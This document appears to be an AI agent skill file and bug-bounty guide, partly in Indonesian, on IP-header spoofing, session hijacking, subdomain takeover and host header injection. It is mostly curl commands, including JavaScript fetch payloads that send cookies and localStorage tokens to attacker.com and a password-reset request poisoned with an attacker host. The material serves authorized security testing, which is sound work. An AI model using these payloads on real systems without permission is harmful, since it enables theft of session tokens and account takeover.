---
name: ip-and-session-hijacking
description: "Use for IP spoofing, session hijack, subdomain takeover."
tags: [bug-bounty, ip-spoofing, session-hijacking, subdomain-takeover, host-header, dns]
---

# IP & Session Hijacking — Bug Bounty Techniques

## 1. IP Spoofing via HTTP Headers

Many apps trust client-supplied IP headers for rate limiting, geo-restriction, or access control bypass.

### Headers to inject
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

### Test
```bash
# Bypass IP restriction
curl -s -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
# Bypass rate limit (beda XFF = beda identity)
curl -s -H "X-Forwarded-For: 1.2.3.4" https://target.com/api/login
```

### Yang dicari
- Admin panel restrict by IP → bypass dengan 127.0.0.1
- Rate limit bypass → rotate XFF per request
- Geo-restricted content → spoof IP negara allowed
- Internal API → spoof 10.x.x.x atau 192.168.x.x

**Impact: Medium-High (CVSS 5-8)**

---

## 2. Session Hijacking

### Checklist cookie flags
- [ ] Missing `HttpOnly` → JS-accessible, stealable via XSS
- [ ] Missing `Secure` → transmitted over HTTP
- [ ] Missing `SameSite` → CSRF possible
- [ ] Session tidak di-invalidate saat logout
- [ ] Session tidak dirotasi setelah login (session fixation)
- [ ] Token lifetime terlalu panjang (>24h)

### Session Fixation Test
```bash
# 1. Ambil token sebelum login
curl -sc /tmp/cookies.txt https://target.com/login
# 2. Login dengan token itu
curl -sb /tmp/cookies.txt -X POST -d "user=x&pass=y" https://target.com/login
# 3. Cek: apakah token SAMA setelah login? = Session Fixation
```

### Via XSS
```javascript
// Steal cookie
fetch('https://attacker.com/?c=' + document.cookie)
// Jika HttpOnly: ambil dari localStorage
fetch('https://attacker.com/?t=' + localStorage.getItem('token'))
```

---

## 3. Subdomain Takeover (DNS Hijacking)

Subdomain abandoned masih punya CNAME ke layanan eksternal yang sudah tidak aktif → attacker klaim.

### Enumerate dangling CNAME
```bash
# Subdomains via crt.sh
curl "https://crt.sh/?q=%.target.com&output=json" | python3 -c "
import sys,json
d=json.load(sys.stdin)
[print(x['name_value']) for x in d]
" | sort -u > subs.txt

# Check tiap subdomain
for sub in $(cat subs.txt); do
    cname=$(dig +short $sub CNAME)
    if [ -n "$cname" ]; then
        code=$(curl -so /dev/null -w "%{http_code}" "https://$sub" 2>/dev/null)
        echo "$sub -> $cname | HTTP $code"
    fi
done
```

### Fingerprint per service
| Service | Response signature |
|---|---|
| GitHub Pages | `There isn't a GitHub Pages site here` |
| AWS S3 | `NoSuchBucket` |
| Azure | `404 Web Site not found` |
| Heroku | `No such app` |
| Fastly | `Fastly error: unknown domain` |
| Shopify | `Sorry, this shop is currently unavailable` |
| Surge.sh | `project not found` |

**Impact: Critical jika cookie scope = parent domain**

---

## 4. Host Header Injection

Server pakai `Host:` header untuk build password reset links, email verification, dll.

### Test
```bash
curl -s -X POST https://target.com/api/password-reset \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'
# Jika victim dapat link https://attacker.com/reset?token=xxx → Critical

# Variants
curl -H "X-Forwarded-Host: attacker.com" ...
curl -H "X-Host: attacker.com" ...
```

**Impact: Critical — password reset poisoning, open redirect, cache poisoning**

---

## 5. BGP/ARP Hijacking

- BGP = ISP-level, butuh kontrol autonomous system → **out of scope** hampir semua program
- ARP = LAN-level, butuh akses jaringan sama → **out of scope** untuk web bug bounty

---

## Pitfalls

- XFF bypass hanya works jika app trust header tanpa validasi (cek apakah di belakang proxy)
- Subdomain takeover: verify dulu sebelum klaim, jangan serve malicious content
- Host header: beberapa WAF block mismatched Host → test dengan X-Forwarded-Host juga
- Session fixation: buktikan token identik pre/post login dengan diff
